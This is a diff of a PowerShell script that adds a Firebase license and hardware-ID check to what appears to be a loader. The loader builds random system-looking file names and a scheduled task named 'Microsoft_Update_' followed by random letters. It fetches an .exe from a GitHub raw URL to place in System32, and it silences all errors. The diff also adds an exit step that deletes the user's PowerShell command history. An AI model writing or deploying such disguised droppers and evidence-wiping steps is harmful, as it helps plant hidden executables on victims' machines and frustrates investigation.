@@ -1,7 +1,6 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 # --- [ CONFIGURATION ] ---
-# URL ของคุณที่ระบุโซน asia-southeast1 และชี้ไปที่ node 'licenses'
 $DbUrl = "https://project-8a76e-default-rtdb.asia-southeast1.firebasedatabase.app/licenses"
 
 function Get-HWID {
@@ -18,30 +17,24 @@ $myHwid = Get-HWID
 Write-Host "Connecting to Firebase..." -ForegroundColor Cyan
 
 try {
-    # ดึงข้อมูลคีย์จาก Firebase
     $data = Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Get
 
-    # 1. ตรวจสอบว่ามีคีย์นี้ในระบบไหม
     if ($null -eq $data) {
         Write-Host "Error: Key not found in database!" -ForegroundColor Red
         Start-Sleep 2 ; exit
     }
 
-    # 2. ตรวจสอบสถานะการใช้งาน
     if ($data.status -ne "active") {
         Write-Host "Error: This key has been disabled or expired." -ForegroundColor Red
         Start-Sleep 2 ; exit
     }
 
-    # 3. ระบบล็อค HWID
     if ([string]::IsNullOrEmpty($data.hwid)) {
-        # ถ้าในฐานข้อมูลยังไม่มี HWID (คีย์ใหม่) ให้บันทึก HWID เครื่องนี้ลงไป
         $payload = @{ hwid = $myHwid } | ConvertTo-Json
         Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Patch -Body $payload
         Write-Host "Success: HWID registered to this PC!" -ForegroundColor Green
     } 
     elseif ($data.hwid -ne $myHwid) {
-        # ถ้ามี HWID อยู่แล้วแต่ไม่ตรงกับเครื่องที่รัน
         Write-Host "Error: HWID Mismatch! Key is locked to another PC." -ForegroundColor Red
         Write-Host "Contact Admin to reset your HWID." -ForegroundColor Gray
         Start-Sleep 3 ; exit
@@ -58,11 +51,11 @@ try {
 # -------------------------
 
 # --- [ ORIGINAL CODE START ] ---
-$p = @("font","drv","host","win","svc") | Get-Random
-$m = @("vcp","mgr","svc","hosts","core") | Get-Random
-$r = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
-$fileName = "$p$m`_$r.exe"
-$taskName = "Microsoft_Update_$r"
+$p_rand = @("font","drv","host","win","svc") | Get-Random
+$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
+$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
+$fileName = "$p_rand$m_rand`_$r_rand.exe"
+$taskName = "Microsoft_Update_$r_rand"
 $destPath = "C:\Windows\System32\$fileName"
 $exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhost.exe"
 
@@ -111,6 +104,9 @@ while ($true) {
         pause
     }
     elseif ($choice -eq "0") {
+        # --- [ โค้ดที่สั่งรันเมื่อกดออก ] ---
+        $p_history = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+        if(Test-Path $p_history){ Remove-Item $p_history -Force }
         exit
     }
 }
